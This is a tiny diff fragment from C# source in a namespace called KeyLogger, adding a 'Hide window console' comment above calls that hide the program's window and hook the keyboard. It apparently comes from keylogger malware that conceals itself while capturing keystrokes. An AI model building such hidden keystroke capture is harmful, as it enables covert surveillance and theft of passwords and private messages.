@@ -164,6 +164,7 @@ namespace KeyLogger
         #endregion
         static void Main(string[] args)
         {
+            // Hide window console
             HideWindow();
             HookKeyboard();
         }
